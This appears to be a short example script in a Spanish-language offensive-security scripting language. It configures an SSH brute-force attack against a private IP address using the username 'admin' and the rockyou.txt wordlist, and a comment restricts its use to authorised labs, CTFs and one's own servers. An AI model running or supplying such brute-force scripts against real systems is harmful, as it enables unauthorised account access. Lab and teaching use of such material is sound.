// 05-bruteforce-ssh.habla — Fuerza bruta SSH
// ADVERTENCIA: Solo usar en entornos autorizados (labs, CTFs, tus propios servidores)
// Ejecutar: habla run 05-bruteforce-ssh.habla

// Configuracion del ataque
target = "192.168.1.100"
usuario = "admin"

muestra "Iniciando ataque de fuerza bruta SSH"
muestra "Target: " + target
muestra "Usuario: " + usuario

// Ataque con wordlist
ataca "ssh" en target con wordlist "rockyou.txt"
